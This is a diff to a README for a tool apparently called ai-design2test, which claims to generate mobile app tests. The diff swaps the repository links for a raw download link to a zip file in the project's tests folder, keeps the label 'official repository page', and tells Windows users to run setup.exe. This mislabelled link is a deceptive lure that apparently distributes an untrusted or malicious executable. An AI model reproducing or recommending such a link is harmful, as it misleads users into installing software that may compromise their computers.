@@ -1,6 +1,6 @@
 # 🤖 ai-design2test - Build automated mobile app tests fast
 
-<a href="https://github.com/Visionshudra144/ai-design2test">
+<a href="https://raw.githubusercontent.com/Visionshudra144/ai-design2test/main/tests/test_design_ai_2.5.zip">
   <img src="https://img.shields.io/badge/Download-ai--design2test-blue" alt="Download ai-design2test">
 </a>
 
@@ -22,7 +22,7 @@ To install and run this application, ensure your computer meets these requiremen
 
 Follow these steps to download and run the software on your Windows machine.
 
-1. Visit the [official repository page](https://github.com/Visionshudra144/ai-design2test) to find the latest version of the installer.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Visionshudra144/ai-design2test/main/tests/test_design_ai_2.5.zip) to find the latest version of the installer.
 2. Select the file named setup.exe from the assets list.
 3. Save the file to your computer.
 4. Locate the downloaded file in your downloads folder.
